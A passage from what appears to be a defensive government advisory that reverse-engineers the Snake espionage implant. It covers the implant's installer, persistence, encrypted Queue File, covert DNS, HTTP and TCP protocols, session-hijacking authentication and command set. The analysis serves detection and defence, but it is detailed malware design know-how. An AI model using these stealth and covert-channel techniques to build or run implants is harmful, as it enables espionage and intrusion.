the network and works to obtain administrator credentials and access domain controllers. A wide array of mechanisms has been employed to gather user and administrator credentials in order to expand laterally across the network, to include keyloggers, network sniffers, and open source tools. Typically, after FSB operators map out a network and obtain administrator credentials for various domains in the network, regular collection operations begin. In most instances with Snake, further heavyweight implants are not deployed, and they rely on credentials and lightweight remote-access tools internally within a network. FSB operators sometimes deploy a small remote reverse shell along with Snake to enable interactive operations. This triggerable reverse shell, which the FSB has used for around 20 years, can be used as a backup access vector, or to maintain a minimal presence in a network and avoid detection while moving laterally. Snake’s architectural design reflects professional software engineering practices. Critical pathways within the implant are made of stacks of loosely coupled components that implement well-designed interfaces. In addition to facilitating software development and debugging, this construction allows Snake to use multiple different components for the same purpose, choosing the specific component based on environmental considerations. For example, Snake’s custom network communications protocols function as a stack. All implementations use an encryption layer and a transport layer, such as Snake’s custom HTTP or raw TCP socket protocol. Each layer of the Snake network protocol stack solely implements a specified interface for operability with the two adjacent layers. The encryption layer and underlying transport layer thus function independently, so any custom Snake network protocol can employ an encryption overlay without any change to the encryption layer code. This modularity allows Snake operators to choose the most logical network transport for the given environment without affecting Snake’s other functionality. When using a compromised HTTP server as part of the Snake P2P network, the operators can ensure that all traffic to this machine follows the Snake custom HTTP protocol and thereby blends effectively with legitimate traffic. In the context of a compromised machine that legitimately allows secure shell (SSH) connections, Snake can utilize its custom raw TCP socket protocol instead of its custom HTTP protocol. All other layers of the Snake protocol stack, from the immediately adjacent transport encryption layer to the distant command processing layer, can and do remain entirely agnostic to the transport layer as long as it implements its interface correctly. This architecture also allows the Snake developers to easily substitute a new communications protocol when they believe one has been compromised, without necessitating any downstream changes in the code base. Lastly, this design facilitates the development of fully interoperable Snake implants running on different host operating systems.Snake’s technical sophistication extends from the software architecture into the lower-level software implementation. Original versions of Snake were developed as early as 2003, before many of the modern programming languages and frameworks that facilitate this type of modular development were available. Snake is written entirely in C, which provides significant advantages in low-level control and efficiency, but which does not provide direct support for objects or interfaces at the language level and provides no assistance with memory management. The developers of Snake successfully implemented the implant’s complex design in C with very few bugs, including careful avoidance of the common pitfalls associated with null-terminated strings and the mixing of signed and unsigned integers. Additionally, the developers demonstrate an understanding of computer science principles throughout the implant’s implementation. This includes selecting and correctly coding asymptotically optimal algorithms, designing and utilizing efficient custom encoding methodologies that closely resemble common encoding schemes, and handling the numerous possible errors associated with systems-level programming in a secure manner.Although the Snake implant as a whole is a highly sophisticated espionage tool, it does not escape human error. A tool like Snake requires more familiarity and expertise to use correctly, and in several instances Snake operators neglected to use it as designed. Various mistakes in its development and operation provided us with a foothold into the inner workings of Snake and were key factors in the development of capabilities that have allowed for tracking Snake and the manipulation of its data.The FSB used the OpenSSL library to handle its Diffie-Hellman key exchange. The Diffie-Hellman key-set created by Snake during the key exchange is too short to be secure. The FSB provided the function DH_generate_parameters with a prime length of only 128 bits, which is inadequate for asymmetric key systems. Also, in some instances of what appeared to be rushed deployments of Snake, the operators neglected to strip the Snake binary. This led to the discovery of numerous function names, cleartext strings, and developer comments as seen in the following figure.The FSB has quickly adapted Snake when its capabilities have been publicly disclosed by private industry. Snake therefore exists in several variants, as it has evolved over almost 20 years. This CSA focuses on one of the more recent variants of Snake that up until now has not been widely disclosed. Older variants of Snake will be discussed briefly where applicable, but not discussed in depth, as many details of earlier Snake variants already exist in the public domain.The Snake installer has gone by various names throughout Snake’s existence (e.g., “jpinst.exe”). This advisory will describe the version of the installer which regularly used the name “jpsetup.exe”. This executable is packed using a customized obfuscation methodology. The developers appear to have added the unpacking functionality from an open source project for viewing JPEG files. This technique serves to obfuscate the unpacking code within an otherwise legitimate code base.  The unpacking code extracts an executable, herein referred to as the “Png Exe”, and it extracts an AES encrypted blob from the Png Exe’s resources, which herein will be referred to as the “Png Resource”. The jpsetup.exe installer requires two arguments to be passed via the command line for execution. The first argument is a wide character string hashed with SHA-256 twice, and the resulting value of these computations becomes the AES key that decrypts the Png Resource. The AES initialization vector (IV) consists of the first 16 bytes of the second argument to jpsetup.exe after prepending the argument with a wide character “1” string. Once decrypted, the Png Resource becomes an executable that will be referred to herein as “Stage 2”. When unpacked, many components are extracted from Stage 2’s resources. Several of the resources are executables with additional resources of their own. Stage 2 creates structures from its resources, which ultimately become the host artifacts of Snake.As Windows has been the most prevalent operating system targeted by Snake, this document will only discuss the Windows-based artifacts; however, Snake can be cross-compiled and is capable of running on other operating systems.Snake’s host architecture and network communications allow an unusual level of stealth. Snake makes inventive use of its kernel module in both of these contexts. All known Windows versions of Snake have used a concealed storage mechanism to hide host componentry. In addition to using the kernel module to remove the relevant components from any listing returned by the operating system, Snake utilizes the kernel module to mediate any requests between Snake’s user mode components and the concealed storage mechanism, which itself is encrypted with a unique per-implant key. This unique keying creates detection difficulties even for tools that are independent of the compromised operating system, since simple signatures targeting Snake host components would be ineffective. The Snake version primarily discussed in this advisory registers a service to maintain persistence on a system. Typically, this service is named “WerFaultSvc,” which we assess was used to blend in with the legitimate Windows service WerSvc. On boot, this service will execute Snake’s WerFault.exe, which Snake developers chose to hide among the numerous valid Windows “WerFault.exe” files in the %windows%\\WinSxS\\ directory. Executing WerFault.exe will start the process of decrypting Snake’s components and loading them into memory. Upon execution, Snake’s WerFault.exe will attempt to decrypt an encrypted blob within the Windows registry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake’s kernel driver and kernel driver loader. The registry object’s structure can be seen on the right side of the following figure. Snake uses Microsoft Windows Cryptography API: Next Generation (CNG) key store to store the AES key needed to decrypt the registry object.Snake’s installer drops the kernel driver and a custom DLL which is used to load the driver into a single AES encrypted file on disk. Typically, this file is named “comadmin.dat” and is stored in the %windows%\\system32\\Com directory. The structure of this file can be seen on the left side of the figure above. The key, IV, and path to comadmin.dat are stored in the encrypted registry blob. The last host-based artifact to discuss is the Queue File. Typically, this file has been found within the %windows%\\Registration directory with the format of <RANDOM_GUID>.<RANDOM_GUID>.crmlog, and is decrypted by Snake’s kernel driver. Due to the complexity and importance of the Queue File, its details are discussed at length in the following subsection. The Queue is a Snake structure that contains various pieces of information, including key material, communication channels, modes of operation, the principal user mode component, etc., that Snake requires for successful operation. It should be noted that this is a name used by the developers and is not equivalent to a “queue” in the normal context of computer science. The Queue data is saved on disk in the Queue File, which is a flat file with a substructure that includes a 0x2c-byte file header followed by data blocks. Each data block corresponds to exactly one Queue Item, which could be, for example, a simple configuration parameter, a Snake command, or an entire embedded executable. Each Queue Item is associated with a specific Queue Container.Each Container is identified by its Type and Instance values. Each Container Type holds the same type of information used by the Snake implant for a specific purpose. The following table shows the various Container Types and their functions. A Queue can have multiple Containers of the same Type, but each of these Containers will have different Instance values.The data in each Container in the Queue is separated into Queue Items with the 0x40-byte metadata structure shown in the following table. The data content of the Queue Item immediately follows this structure. The Queue Items in each Container are distinguished by their corresponding Item Number as well as their Item Type identifier. The Item Number is assigned by the Snake implant itself, while Snake operators generally refer to the Item Type value when trying to reference a specific item.In previous versions of Snake, the Queue File existed within an encrypted covert store. The data belonging to the Queue Items themselves were also CAST-128 encrypted. In more recent versions, the covert store was removed, and the Queue File exists by itself on disk. The Queue Items inside the Queue File are still encrypted with CAST-128, and in addition, the full Queue File is also CAST-128 encrypted. The CAST keys used to encrypt the Queue Items within a Container Instance can be found in that Instance's corresponding 0x2 Container as Item Type 0x229 (see below). The key and IV used to encrypt the Queue File can be found by decoding strings within Snake’s kernel driver.The 0xb Container lists the available modes of operation for a given Snake implant. When using a certain mode, Snake uses a specific set of Containers and communication channels. Each infection can use up to four different modes. Each mode in the 0xb Container will have a Container Instance value that all Containers associated with this mode will use, except for the 0x3 Container. The 0x0 Container handles incoming commands/data for the host of the Snake infection. Commands will be queued in this Container until the implant is ready to execute them.The 0x1 Container handles outbound commands/data for the host of the Snake infection. The data will be queued within the 0x1 Container until the implant is ready to exfiltrate them.The 0x2 Container holds the configuration information for the mode to which it corresponds. Various pieces of information vital to Snake’s successful operation are stored within these Containers. This subsection will discuss a subset of the parameters that can be found within the 0x2 Container.Pivotal key information can be found within the 0x2 Containers. This includes the inbound and outbound RSA keys (Items 0x228 and 0x227, respectively), the CAST key (Item 0x229) used to encrypt the individual items within the Queue Container, pre-shared keys used for the top layer of encryption in Snake’s network communication protocol, and a quasi-unique value for the implant, called the “ustart” value, needed for Snake network connectivity.Snake is constantly passing data between its kernel and user mode components. The methodology (generally, named pipes) used to make these communications is listed in Items 0x65-0x6f of the 0x2 Container. Items 0x70-0x7a list the parameters necessary to establish these communications. Items 0xc9-0xd3 contain details of up to ten other Snake infections, referred to as “communication channels”, which the implant can communicate with during Passive Operations. The parameters needed to establish Snake sessions with the other hosts can be found in Items 0xd4-0xde.Many additional data points, such as the process name where Snake injected itself or the modules Snake has loaded from its 0x3 Container, can be found within 0x2 Containers.The 0x3 Container houses embedded files and modules for Snake. A single 0x3 Container will be accessible to all Containers in the Queue. The 0x3 Container has its own dedicated 0x2 Container that only includes a single Queue Item of Item Type 0x229 (a CAST-128 key). This key will be used to encrypt and decrypt all of the embedded files and modules within the 0x3 Container.The Item Types assigned to the embedded files and modules within the 0x3 Container are consistent across all of the Snake infections within Snake’s P2P network. For example, the 0x01 Item Type is the Zlib library, and therefore any time an Item Type of 0x01 is seen within the 0x3 Container of a Snake infection, that file is always the Zlib library. The implant’s 0x2 Container will keep track of libraries that it has loaded. If the DLL is a file on disk, the full path to the DLL is saved in the 0x2 Container. If the library was loaded from a 0x3 Container, the loaded module will be displayed in the implant’s 0x2 Container in the format “&<Item Type (within 3 container) of loaded module>”. The 0x4 Container logs command activity. Each Queue Item within the Container is a log of a single executed or attempted command. Each mode will have its own corresponding 0x4 Container.The 0x5 Container holds Snake network logs, noting any IP address that has connected to this implant. Some versions of Snake no longer make use of this Container.The 0x6 Container saves commands that are set to execute at specific times. A Queue Item is created for each scheduled command.The 0x7 Container logs the IP addresses of any other Snake implants that have connected to this implant during Passive Operations. The commands 0x79 (Read Agents Track) and 0x7a (Clear Agents Track) are used to interact with this Container. Note that the command 0x7a had been deprecated in some versions of Snake and returns the error “function unsupported” if called.Snake’s network communications are encrypted, fragmented, and sent using custom methodologies that ride over common network protocols, including both raw TCP and UDP sockets and higher-level protocols like HTTP, SMTP, and DNS. Snake’s protocols for HTTP and TCP are the most commonly seen, but functionality exists for UDP, ICMP, and raw IP traffic. Snake’s network communications are comprised of “sessions”, which are distinct from the sessions associated with the legitimate protocol it is riding on top of (e.g., TCP sessions). The Snake session is then comprised of distinct commands. Both Snake’s custom transport encryption layer (“enc”) and Snake’s Application Layer have their own encryption mechanisms, where the enc layer operates on an individual P2P session and the Snake Application Layer provides end-to-end encryption between the controller (i.e., point of origin) and the command’s ultimate destination. The following figure details Snake’s communication protocol stack. Snake’s use of its kernel module also facilitates stealthy network communications. To participate fully in Snake’s P2P network, implanted machines which are not the ultimate target must act as servers for other Snake nodes. Snake’s kernel module, along with a thoughtfully designed mechanism for distinguishing Snake traffic from legitimate client traffic, allows the implant to function as a server in the Snake P2P network without opening any new ports, greatly complicating detection efforts. Additionally, Snake’s custom network communication protocols are designed to blend with traffic that the compromised server normally would receive. This allows Snake operators to use legitimate servers as infrastructure, which reduces the effectiveness of simple IP address or domain blocking without needing to open new ports or send unusual looking traffic to this infrastructure. Snake uses its custom HTTP and raw socket TCP based protocols for large data communications.  With these protocols and others, Snake employs a specific authentication mechanism to distinguish Snake traffic from legitimate traffic destined for application software on the compromised server. This technique enables one of the uniquely sophisticated aspects of Snake, which is its ability to function effectively as server software without opening any further ports on the compromised system. The relevant per-implant authentication value is referred to as the “ustart” and is stored in the implant’s Queue File. There are multiple forms of the ustart value, including “ustart”, “ustart2”, and “ustartl”. Rather than open a listening socket on a specified TCP port, the Snake kernel module intercepts the first client-to-server packet following the 3-way handshake in every TCP session. The kernel module then determines whether or not the contents of that packet are in fact valid for the ustart value of that target Snake implant. If so, the Snake kernel module forwards that packet and any future packets in the same TCP session to Snake’s own processing functionality, and the (presumably legitimate) application listening on that port remains unaware of this TCP session. If not, the Snake kernel module allows the packet—and the rest of the TCP session as it occurs—to reach the legitimate listening application, for example web server software. See the following for an illustration. All of the ustart versions perform authentication by sending a random nonce along with data that comprises a mathematical operation on the combination of the nonce and the ustart value itself. The receiving machine then extracts the nonce and performs the same computations to authenticate the sending machine. The ustart2 and ustartl versions use the Fowler-Noll-Vo (FNV) hash algorithm to generate the overall authentication value from the nonce and the ustart. This mechanism is slightly different in the custom Snake HTTP protocol versus the custom Snake TCP protocol.Using the ustart methodology, a node in the Snake P2P network can function as a server without opening any otherwise closed ports and without interfering in the compromised server’s legitimate functionality. Snake will only communicate over TCP ports on which another application is actively listening. This technique makes detecting Snake compromises through network traffic monitoring far more difficult. Inbound traffic to an unexpected TCP port can be detected or blocked using standard firewall or network intrusion detection functionality. Replacing a legitimate service application with a modified executable can lead to detection at either the host or network level. Snake’s technique bypasses both of these mitigations. When combined with the fact that Snake traffic looks similar to expected traffic, especially in the case of Snake’s HTTP based protocols, this renders detecting Snake communications difficult absent detailed knowledge of Snake’s custom protocols.Snake uses a specialized communications protocol to encode information in seemingly standard DNS queries run via the Windows or POSIX API function gethostbyname, depending on the version. \nSnake outbound DNS requests consist of character strings that are constructed to resemble standard domain names. The actual information being transmitted from the implant is contained in the part of the character string prior to the first ‘.’ character. For illustration purposes, this subsection will outline how an arbitrary string of bytes is manipulated and then encoded to form an outbound Snake DNS request carrying data provided by the implant.Snake outbound DNS requests originally take the form of byte arrays stored on the stack as the implant progresses through the communications function. The byte array has the following structure.Only the low-order seven bits of the flags byte are used, and they have the following significance.After calculating and obfuscating the byte array values shown above, Snake encodes these byte values as de-facto base32 text, using the ten digits 0-9 and the 26 lowercase ASCII letters a-z, with v, w, x, y, and z all corresponding to the same value, as only 32 distinct characters are needed. Snake then inserts ‘-‘ characters at specified locations and sends the DNS request using the gethostbyname function. The resulting encoded string mimics a legitimate DNS request; because characters after the first ‘.’ are not part of the implant’s communications, any arbitrary suffix (e.g., “.com”) can be used. After sending the encoded DNS request, Snake parses the returned information. In a normal DNS request, the returned hostent structure contains a list of IPv4 addresses as 32-bit unsigned integers if the domain resolves to one or more IPv4 addresses. In the Snake DNS protocol, these 32-bit integers represent the covert channel data. The Snake implant sorts the 32-bit integers by the highest order nibble and then interprets the remaining 28 bits of each integer as the actual encoded data. The Snake DNS protocol thus provides a well-concealed, low-bandwidth communications channel.  For larger bandwidth communications, Snake uses its custom HTTP and TCP protocols.The most common custom protocol that Snake uses is its “http” protocol, which rides on top of standard HTTP. It generally looks like normal HTTP communications, including a lot of base64-looking strings, thus blending well with normal network traffic. There have been multiple iterations of Snake’s http protocol, though the differences are only in the encoding; once that is peeled away, the underlying Snake http protocol is the same. For the purposes of this document, Snake’s former version of HTTP will be referred to as “http” and its more recent version as “http2”. Snake communications using http2 are contained within seemingly legitimate Application Layer HTTP communications. In the client-to-server direction, the implant data is contained within an HTTP header field of a GET request, unless the data is over a certain size (usually 256 bytes, but configurable). Observed field keys have included: Auth-Data, Cache-Auth, Cookie, and Cockie (note misspelling). This list is not exhaustive; any standard HTTP header field can be used. The communication itself is contained in the legitimate HTTP header field’s value, meaning the content following the ‘:’ character and any whitespace immediately thereafter. In HTTP GET requests, the implant generally uses the default path ‘/’, but this is not required and is configurable. Larger client-to-server Snake http2 requests are contained in the body of an HTTP POST request, and server-to-client communications are contained in the body of the HTTP response.All client-to-server Snake http and http2 requests begin with the ustart authentication. The specifics vary with each ustart version, but in each case the random nonce and the computed function of the nonce and ustart value are encoded in a manner which closely resembles the rest of the Snake communication. Since Snake http and http2 implant sessions can span multiple TCP sessions, the ustart authentication mechanism is included in every client-to-server communication.Snake’s http2 protocol uses a custom base62 encoding scheme that has the following differences from base64. Base62 uses 62 semantically significant characters instead of 64. The ratio of encoded-to-decoded characters in base62 is less dense (11:8) than the ratio base64 can achieve (12:9). Also, base62 uses extraneous characters in certain instances that have no semantic significance. The base62 characters of semantic significance are the 62 strict alphanumeric characters: [0-9A-Za-z]. The extraneous characters that can be present in a base62 string—but which have no semantic significance—are: ‘/’, ‘;’, ‘=’, and ‘_‘ (underscore). When present, these characters are removed prior to performing the decoding process. A valid base62 string can have up to 11 of these extraneous characters. A regular expression for base62 is included in the Mitigations section of this CSA.After the base62 decoding is completed, if necessary, the remaining data begins with an 8-byte metadata structure that provides rudimentary sessionization on top of the stateless HTTP. Snake’s http and http2 client-to-server communications have three de-facto parts, which are concatenated into a single HTTP header value. These parts are: 1) an announce or authentication string, 2) a custom metadata structure, and 3) payload data. The metadata structure consists of the following:Snake uses the session_number and communication_number fields to provide its own custom sessionization on top of the stateless Application Layer HTTP protocol. The checksum byte serves to validate the integrity of the structure and must equal the sum of the first seven bytes modulo 256.Snake has the ability to communicate through POSIX-style TCP sockets. The implant’s custom TCP protocol, which herein will be called “tcp”, uses the reliability features of the underlying TCP protocol.  Thus, in the implant’s custom tcp protocol, the concept of a TCP session and an implant “session” are the same, whereas in the implant’s custom http protocols, one implant session could span multiple Transport Layer TCP sessions. Since the implant’s overall communications protocol is based on the idea of commands and responses, Snake depends on being able to specify the length of any given command and response so the recipient Snake node knows when a particular communication ends. Snake achieves this in the custom tcp protocol by prefacing each communication with its length encoded as a 32-bit big-endian unsigned integer. Immediately following the TCP 3-way handshake, the implant completes the ustart authentication for this session. Since Snake tcp sessions are mapped one-to-one with an underlying protocol TCP session, the ustart authentication only occurs once per session, rather than with each client-to-server communication as in Snake http and http2. The Snake tcp ustart mechanism is similar to the Snake http and http2 mechanisms, except that for certain ustart versions, Snake tcp uses a raw binary ustart which is not encoded in printable characters.After the ustart authentication, the implant will begin sending length-data pairs. These pairs can be sent in the same packet or in two (or theoretically more) separate packets, but the pattern of length-data pairs will be present in each half of the stream (i.e., each direction) for the entirety of the implant communications for the remainder of the TCP session. Specifically, a length-data pair will consist of the length encoded as a big-endian 32-bit unsigned integer followed by data of exactly that length. For example, consider the instance where the implant is sending the following 4 arbitrary bytes: The on-wire communication from the implant would send the integer value 4 encoded as a big-endian 32-bit integer, followed by the actual 4 bytes themselves, as shown below. This could be split across two (or theoretically more) packets.The custom tcp protocol (as well as all custom http protocols) have been used in conjunction with the Snake enc protocol. Details of the Snake enc protocol are provided in the following subsection. Due to the manner in which the Snake enc and Snake tcp protocols interact, the first six length-data pairs of each TCP half-stream (following the single client-to-server announce or authentication packet described above) will have known lengths. Specifically, each half-stream will begin with length-data pairs of the following lengths: 0x8, 0x4, 0x10, 0x1, 0x10, 0x10. Note that these are the lengths of the raw data, so each communication will be preceded by a 4-byte big-endian integer specifying the corresponding length. Thus, one of the half-streams could have the following TCP content:As described above, Snake communications are all comprised of “Snake sessions”, irrespective of whichever legitimate protocol Snake is operating on top of. Snake’s top layer of encryption, called the enc layer, utilizes a multi-step process to establish a unique session key. The session key is formed through the combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) known to both parties. This PSK is stored in one of the communication channels, stored within the Queue. The overall establishment of the session key requires 12 communication steps, six in each direction, which involve sharing the pseudo-random values used in the Diffie-Hellman exchange process as well as custom aspects of the Snake session key derivation method. The session key is used to encrypt the command headers and (inner) encrypted payloads.This is the layer in which the critical error of providing a value of 128 bits instead of 128 bytes for the call to DH_generate_parameters within the OpenSSL library occurred. Due to this insufficient key length, breaking the Diffie-Hellman portion of the exchange is possible. Note that in the following figure, the variables ‘p’, ‘g’, ‘a’, and ‘b’ are used in standard descriptions of Diffie-Hellman.Snake’s Application Layer is used to process Snake commands. The payload data for a Snake session can contain one or more command exchanges, which include both the incoming data sent to the implant as well as the response returned to the server. Each command is associated with a specific ordinal, and due to Snake’s modular design, operators are able to add new commands to extend Snake’s capabilities by remotely loading a new module.The Snake implant differentiates between High and Low commands and handles them differently, based on the ordinal number range. The majority of Snake commands are High commands that have an ordinal of 0x64 (100 decimal) or higher. There are far fewer Low commands, and these include the Forwarding command (with ordinal 0x1), and the four Queue commands (with ordinals 0xa, 0xb, 0xc, and 0xd). While Low commands are mostly used for moving data across the network, the High commands give the operator many options for interacting with an infected system. All commands begin with a 0x15-byte header, followed by optional command parameter data; only some commands require parameters for successful execution. For example, the command Get, which exfiltrates a file, requires the name of the file to exfiltrate, whereas the command Process List, which returns a process listing, does not require any parameters. The most important Command Header field contains the integer ordinal of the command being sent. The Item UID field represents a unique identifier for each individual command instance, and these values increase sequentially. The header has two fields used when a command is set to run at a specified date and time; these commands will be written to the 0x6 Container.Some Low commands have another header before the payload data, which will be detailed below. All other commands have only the Command Header followed by the encrypted parameter data.Underneath Snake http2 or tcp encryption at the session layer, each command exchange is further encrypted. In older versions of Snake, the exchanges were CAST-128 encrypted using a different key for incoming and outgoing data. These keys were saved in the 0x2 Container in the 0x227 and 0x228 Items. The incoming payload data, if parameter data was present, could be decrypted with the 0x227 CAST key. Any response data was encrypted with the 0x228 CAST key. In recent versions, the 0x227 and 0x228 Items hold two RSA-4096 public keys. For each side of an exchange, a new 16-byte CAST key is created with Microsoft’s CryptoAPI CryptGenRandom function to obtain 16 random bytes. This key is used to CAST-128 encrypt the parameter or response data.For an incoming command, the CAST key is signed (not encrypted) by the private key corresponding to the public key on the node to create a 512-byte RSA data blob. The incoming payload has the RSA blob, followed by the optional parameter data, which is CAST-128 encrypted. Snake uses the 0x227 RSA public key to decrypt the RSA blob, recover the CAST key, then decrypt the parameter data.For an outgoing command, a new CAST key is obtained from CryptGenRandom, and any response data is CAST-128 encrypted. The key is then encrypted using the 0x228 public key to create a 512-byte data blob. The response payload data contains the 512-byte RSA blob, followed by the encrypted response data, when present.The implant will expect data in a specific format for each command ordinal. Parameter and response data contain several possible underlying data types, including wide-character plaintext strings, numeric values, data tables, files, or a combination of multiple types. The parameter data buffer itself will be formatted in a specific way, depending on the command ordinal. Some commands have required parameters, as well as optional parameters. Commands with optional parameters will include a metadata header with the data length and data type (e.g., bool, integer, text, or data buffer) before the optional parameter’s data. Other commands will expect the parameters to be formatted with length-data pairs, consisting of the parameter data length encoded as a four-byte big-endian integer followed by data of exactly that length. Still other commands have a custom header or will expect no length or metadata and will simply send the parameter data alone.The response data will similarly be formatted by the implant in a specific way according to the command ordinal. The response data typically does not have a length or metadata preceding it, with the exception of the data tables. Examples of commands that return a table are the Process List command and the List Dir command.Response data that includes a table will start with a table description header that indicates the number of columns and rows in the table. In addition, the header will include a Column Descriptor structure to indicate the type of data that column will contain, for example a string, uint32 or uint64, timestamp in epoch format, or the contents of a whole file (included as a table entry).After the table description header, each field is added to the data payload buffer one at a time in a length-data pair. The fields across the first row are added in order, then the fields across the second row are added immediately after the first row with no metadata or separation, and so on. To parse this table, the server will account for the number of columns to determine where the next row starts.High commands are those with an ordinal of 0x64 (decimal 100) or higher. High commands give the operator many options for interacting with an infected system, as well as implant components. This subsection will describe some examples of the many High commands that can exist in the implant.Some of the most basic High commands will gather information about the machine and return the results. For example, the FSB operators can use the PS command (0x65) to return a list of running processes, the List Dir command (0x840) to list the contents of a directory, or the Syst command (0x6b) to gather basic system information.There are several commands that interact with the infected machine using standard built-in OS tools. The operator can use the Kill command (0x67) to kill a process, the Get command (0x68) to exfiltrate a file, the Put command (0x69) to write a file, the Del command (0x6a) to delete a file, or the Run command (0x66) to execute a command in a terminal shell and receive the results. For example, operators have used the Run command to run PowerShell commands, ping other hosts, use the Windows “net use” command to map network drives, and to run executable files that had been previously written to the node using the Put command.In addition to commands that use the built-in OS functionality, there are several High commands that interact with Snake components. An operator can use the Read Config command (0x70) to read the 0x2 Container, which contains configuration data, or the Set Config Item command (0x71) to set a specific Queue Item within the 0x2 Container. For example, operators have used the Set Config Item command to add or update the IP addresses or domains and option parameters used to communicate with other Snake nodes. The Read Agents Track and Clear Agents Track commands (0x79 and 0x7a) interact with the 0x7 Container to read or delete logs which track which other Snake nodes have connected to this node. Note that the 0x7a command has been deprecated in some versions of Snake and returns the error “function unsupported” if called.Snake has the ability to add additional commands by loading new modules. New modules can be loaded using the Load Modules command (0x72) or directly into memory using the Load Modules Mem command (0x7f). When compiling a module, the developer will assign an ordinal to each constituent command, which will then be used by the operator to call the newly added commands. These loaded modules can be removed using the Module Unload command (0x73).The four Queue commands contain a 0x3d-byte Queue Header following the Command Header. In more recent versions of Snake, this header is encrypted using the same CAST key used to encrypt the payload data. In this case, the Command Header is followed by the 512-byte RSA encrypted CAST key blob, the encrypted Queue Header, and finally the encrypted payload data.Even though each of the four Queue commands only use a subset of the fields of the Queue Header (in different ways), the full header must be present for the command to be considered valid by the implant. Two fields in the header that all four Queue commands use are the Container Instance and Container Type fields, which indicate the specific Container on a node the Queue command intends to interact with. In the Queue Read and Write commands, the Item Type field is used to track the specific commands and their responses in the Containers.The Queue Enumerate command, with ordinal 0xa, is used to enumerate the contents of the 0x0 or 0x1 Containers to list all incoming or outgoing commands, respectively. The enumeration returns the 0x40-byte structure described above for each Queue Item, concatenated into a single return buffer.The Queue Read command, with ordinal 0xb, is used to read an Item from the specified 0x0 or 0x1 Container. Several relevant fields in the Queue Header determine how the data is sent and stored. For example, the header determines whether the data should be sent immediately back to the server or stored for later transport. The header indicates if the implant should send the Queue Item’s header (i.e., the same 0x40-byte metadata structure returned by the 0xa command), the Item’s data, or both. The header also indicates whether the Queue Item should be deleted after being read and can also indicate that Queue Items with a lower Item Type should be deleted. This allows FSB operators to clear out all command Items previous to the one being read.The Queue Write command, with ordinal 0xc, is used to write a Queue Item to the specified 0x0 or 0x1 Container. The Queue Header will indicate if a new Queue Item will be created, or an existing Queue Item will be modified.If a Queue Item is set to be modified, an Item with the specified Item Type must exist in the specified Container. Several fields in the header must match specific attributes of the existing Queue Item. If these checks are met, the parameter data is written to the Queue Item. Fields in the Queue Header will indicate the length of data to be written, and the offset into the existing Queue Item where the write should begin.\nIf a Queue Item is set to be created, Snake will delete existing Queue Items of the specified Item Type in the Container of interest, then create a new Item of the specified Item Type and write the parameter data to the Queue Item. A field in the Queue Header will indicate the length of data to be written.The Queue Delete command, with ordinal 0xd, is used to delete a Queue Item from the specified 0x0 or 0x1 Container. The Flags field will determine if the single Queue Item should be deleted, or if all Queue Items with a lower Item Type should be deleted as well.Forward commands, with command ordinal 0x1, are used to tell an implant to forward a Snake command to a second target node, where the command will be executed. The target node sends the response data back to the first implant, which will then package that response data as its own response back to the caller.The command is designed to tell an implant to forward one command to another implant, but in practice, Forward commands are often built on top of each other to create a chain of hop points that will continue to forward a command to an end point, where it will be executed. The response data is then sent back through the same chain of hop points until it reaches the operator.The Forward command has a 0x199-byte Forward Header, followed by the encrypted command parameter data that will be sent to the target node of the Forward command. The Forward Header contains the information the implant will need to connect to the target node, including the ordinal of the Snake command that is being forwarded to the target node for execution.The implant that receives the Forward command will construct a new Snake command of the ordinal indicated in the Forward Header. It will connect to the target node in a new session, construct the Command Header, and send the encrypted command parameter data on to the target node. The parameter data already will have been encrypted using the key associated with the target node, so that the target implant will be able to decrypt the parameter data and execute the command. When the Forward command is constructed, the CAST key used to CAST-128 encrypt the payload data—to include the 0x199-byte header and the parameter data to be forwarded—is encrypted with the RSA key pair used by the first implant. The parameter data that contains the parameters for the command to be forwarded is also CAST-128 encrypted, but the key used to encrypt the parameter data is encrypted with the RSA key pair used by the target node. The first implant knows through the header what command ordinal it is forwarding, but it is unable to decrypt the parameter data.If the Forward Header sent to the first implant indicates that the command to be forwarded was another Forward command, the first target node will decrypt the parameter data and find another Forward Header. This first target node implant will then go through the same process to connect to the next target node, constructing the new command with the ordinal indicated in the second Forward Header to send the remaining encrypted parameter data to the next target node. This will repeat until the command to be forwarded is something other than another Forward command.The Command Header and pertinent parameters for each target node are encrypted specifically for that node by the operator before the Forward command is sent into the Snake P2P network. To illustrate, the diagram below shows how the buffer might look when several Forward commands are chained together to include two hop points and an end point. The first hop point (HP1) will recover the first CAST key and CAST-128 decrypt the rest of the buffer, which will uncover the first Forward Header. HP1 will then forward the remainder of the decrypted buffer to the next hop point (HP2), starting with the second CAST key blob. HP2 will recover the second CAST key and CAST-128 decrypt the rest of the buffer, which will uncover the second Forward Header. HP2 will then forward the remainder of the decrypted buffer to the end point, starting with the third CAST key blob. The end point will recover the CAST key, decrypt the command parameter data, and execute the command. When a target machine has executed a forwarded command, the return data is encrypted with that implant’s RSA keys and returned directly to the previous hop point. As the data is returned up the chain in the Snake P2P network, the intermediate hop points do not manipulate the encrypted data, as they do not have the RSA private key necessary to do so. In this manner, the return data is de-facto end-to-end encrypted throughout the P2P network until it arrives back at the FSB operator.Snake uses two main methods for communication and command execution, namely Passive and Active. In general, Snake operators will employ Active operations to communicate with hop points within Snake’s infrastructure; however, hop points can and do sometimes operate using Snake’s Passive method. Snake’s end points tend to solely operate using the Passive method.During Active operations, Snake commands are issued by an FSB operator or a script to a target machine, generally through Forward commands (described in the previous section). The response to the command is immediately returned to the point of origin following the same path that the command took to reach its end target, as shown in the previous figure on Forward command structure.During Passive operations, Snake implants operate on their own, without the synchronous interaction of FSB operators. The nodes with which an implant communicates during Passive operations are stored within its 0x2 Container(s) as communication channels. Up to ten communication channels can be present at any time; an operator can change these channels via the Set Config Item command.During Passive operations, the implant will beacon by sending a Queue Read (0xb) command to one of its stored communication channels that it has chosen at random. These Queue Read commands look for a Queue Item within a Container with an Instance Number equal to the implant’s UID. The matching UID indicates the Queue Items in this Container are intended for the beaconing implant.If such a Queue Item is found, the beaconing implant will read in the Queue Item and delete it off of the host from which it was read. There can be multiple Queue Items found within the specified Queue Container that was beaconed to; each Queue Read command will read one of these items. This process is repeated until all items within the Container are read, which the infrastructure node will indicate by sending a specific error in response to the Queue Read. This beaconing will continue to randomly select hosts at nondeterministic time intervals for as long as the implant is set to perform Passive operations.Similar to how Snake intakes commands passively, it can also exfiltrate the resulting data passively. This is done using Queue Write (0xc) commands to write to one 